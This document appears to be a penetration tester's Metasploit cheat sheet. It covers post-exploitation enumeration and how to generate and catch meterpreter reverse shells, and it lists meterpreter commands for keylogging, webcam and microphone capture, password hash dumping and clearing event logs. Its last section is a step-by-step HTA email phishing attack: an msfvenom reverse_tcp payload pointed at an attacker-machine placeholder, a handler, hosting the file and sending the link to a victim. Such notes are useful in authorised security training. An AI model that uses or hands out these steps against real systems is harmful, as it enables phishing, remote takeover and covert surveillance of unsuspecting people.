# Metasploit

## Local Enumeration

- Let's suppose we have a shell
- We interact with it using `sessions -i number-of-session`
- `sysinfo` will give info on win version, architecture etc
- `getuid` to have current user info
- `ipconfig` to get network info
- `arp` other information about network
- `netstat -ano` to get info on listener and other
- `ps to check processes
- `run post/windows/gather/enum_services` enumerate services
- `run post/windows/gather/enum_applications` enumerate applications
- `run post/windows/gather/enum_domains` enumerate domains (works better on msf5 than 6)
- `route` check out routes


## Catch a shell with meterpreter

### Generate shell with msfvenom:

`msfvenom --list payloads | grep meterpreter`

### List formats

`msfvenom --list formats`

### To generate payload take in account

- Target OS (Win, Linux, Mac)
- Language you need (Python, PHP, ...)
- Netwok connection types (TCP, HTTPS,...) 

### Cath the shell
`use exploit/multi/handler`
If you want meterpreter commands choose type of payload with meterpreter
Set `LHOST` and `LPORT` and `run` to catch the shell

### Meterpreter Commands
You can see this when typing `help`
```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
```
Note: the commands can change depending on your version of meterpreter

#### Core commands

```
background: Backgrounds the current session
exit: Terminate the Meterpreter session
guid: Get the session GUID (Globally Unique Identifier)
help: Displays the help menu
info: Displays information about a Post module
irb: Opens an interactive Ruby shell on the current session
load: Loads one or more Meterpreter extensions (Kiwi for example)
migrate: Allows you to migrate Meterpreter to another process
run: Executes a Meterpreter script or Post module
sessions: Quickly switch to another session
```

#### File system commands

```
cd: Will change directory
ls: Will list files in the current directory (dir will also work)
pwd: Prints the current working directory
edit: will allow you to edit a file
cat: Will show the contents of a file to the screen
rm: Will delete the specified file
search: Will search for files
upload: Will upload a file or directory
download: Will download a file or directory
```

#### Networking commands

```
arp: Displays the host ARP (Address Resolution Protocol) cache
ifconfig: Displays network interfaces available on the target system
netstat: Displays the network connections
portfwd: Forwards a local port to a remote service
route: Allows you to view and modify the routing table
System commands
clearev: Clears the event logs
execute: Executes a command
getpid: Shows the current process identifier
getuid: Shows the user that Meterpreter is running as
kill: Terminates a process
pkill: Terminates processes by name
ps: Lists running processes
reboot: Reboots the remote computer
shell: Drops into a system command shell
shutdown: Shuts down the remote computer
sysinfo: Gets information about the remote system, such as OS
```

#### Others Commands

```
idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer
keyscan_start: Starts capturing keystrokes
keyscan_stop: Stops capturing keystrokes
screenshare: Allows you to watch the remote user's desktop in real time
screenshot: Grabs a screenshot of the interactive desktop
record_mic: Records audio from the default microphone for X seconds
webcam_chat: Starts a video chat
webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam
webcam_stream: Plays a video stream from the specified webcam
getsystem: Attempts to elevate your privilege to that of local system
hashdump: Dumps the contents of the SAM database
```

## HTA Email Phishing

### Create the payload with msfvenom

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT=443 -f hta-psh -o Benefit.hta
```

### Set up metasploit

- `msfconsole`
- `use exploit/multi/handler`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set LHOST IP-OF-ATTACK-MACHINE`
- `set LPORT 443`
- `exploit -j`

### Host the file

- Launch this in the folder where the payload is `python3 -m http.server 80`

### Send the phishing email

- We can now send an email with a link to our reverse shell `http://IP-OF-ATTACK-MACHINE/name-of-your-script.hta`
- When the phishing receptient will execute the file we will get a reverse shell

### Catch your shell and interact

- In your metasploit shell launch `sessions`
- We should see a new meterpreter sessions from our taget machine
- To interact with it we can do `sessions -i number-of-session`
